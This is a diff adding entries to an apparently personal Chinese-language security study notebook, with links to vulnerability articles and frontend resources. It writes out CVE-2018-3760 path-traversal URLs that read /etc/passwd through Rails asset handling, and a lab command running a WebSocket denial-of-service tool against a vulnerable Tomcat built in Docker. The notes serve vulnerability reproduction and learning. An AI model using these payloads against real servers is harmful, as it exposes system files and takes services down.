@@ -1,5 +1,70 @@
 # 202106
 
+## 0621
+
+https://www.hacking8.com/bug-product/Ruby-On-Rails/CVE-2018-3760-Ruby-On-Rails-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E.html
+
+http://www.0-sec.org:3000/assets/file:%2f%2f/usr/src/blog/app/assets/images/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/etc/passwd
+http://www.0-sec.org:3000/assets/file:///usr/src/blog/app/assets/images/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/etc/passwd
+使用： https://tool.chinaz.com/tools/urlencode.aspx 进行转换
+http://www.0-sec.org:3000/assets/file:///usr/src/blog/app/assets/images/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd
+再进行一次转换
+http://www.0-sec.org:3000/assets/file:///usr/src/blog/app/assets/images/../../../../../../etc/passwd
+
+两个变体
+```
+%2f => /
+%252e%252e/ => %2e%2e/ => ../
+```
+
+框架安全之Spring渗透
+https://www.freebuf.com/vuls/274478.html
+
+如何使用GraphQLmap对GraphQL节点进行渗透测试
+https://www.freebuf.com/articles/network/274296.html
+
+CockpitCMS NoSQL注入漏洞分析
+https://www.anquanke.com/post/id/241113
+
+## 0619
+
+https://brandnewbox.com/notes/2021/03/form-builders-in-ruby/
+Adding Typescript to your Existing Rails App
+https://www.honeybadger.io/blog/typescript-rails/
+https://gorails.com/episodes/rails-web-components
+
+## 0618
+
+https://vuestic.dev/
+https://vuestic.dev/en/getting-started/installation
+
+CVE-2020-13935复现与浅析
+https://www.freebuf.com/vuls/256004.html
+
+Apache Tomcat中的WebSocket存在安全漏洞，该漏洞源于程序没有正确验证payload的长度。攻击者可利用该漏洞造成拒绝服务（无限循环）。
+Apache Tomcat 10.0.0-M1-10.0.0-M6
+Apache Tomcat 9.0.0.M1-9.0.36
+Apache Tomcat 8.5.0-8.5.56
+Apache Tomcat 7.0.27-7.0.104
+
+```bash
+https://hub.docker.com/_/tomcat
+docker pull tomcat:9.0.36-jdk11-corretto
+docker run -it --rm -p 80:8080 tomcat:9.0.36-jdk11-corretto
+
+# [Docker中启动Tomcat后访问报错："HTTP状态 404 - 未找到"](https://www.cnblogs.com/ccku/p/13442652.html)
+sudo docker cp 840bb6c5bc94:/usr/local/tomcat/webapps.dist webapps
+docker run -it --rm -v /home/ubuntu/tomcat/webapps:/usr/local/tomcat/webapps -p 80:8080 tomcat:9.0.36-jdk11-corretto
+sudo docker exec -it 3e6437dd9980 mv /usr/local/tomcat/webapps.dist /usr/local/tomcat/webapps
+
+# 攻击，取消后，服务器负载不会马上恢复
+./tcdos ws://192.168.56.130/examples/websocket/echoStreamAnnotation
+```
+
+redis加固
+https://help.aliyun.com/knowledge_detail/37447.html
+https://help.aliyun.com/noticelist/articleid/1060026197.html
+
 ## 0617
 
 Linux权限提升：自动化信息收集
@@ -21,8 +86,6 @@ https://www.coca.cc/zxgj/23.html
 https://webscan.360.cn/
 360在线网站安全检测，web安全测试AppScan扫描工具，XSS常用的攻击手法
 https://www.cnblogs.com/zdz8207/p/webscan-appscan-xss.html
-
-
 
 Apache Shiro历史高危反序列化漏洞预警 （shiro-550、shiro-721）
 https://www.huaweicloud.com/notice/2018/20210616155641831.html
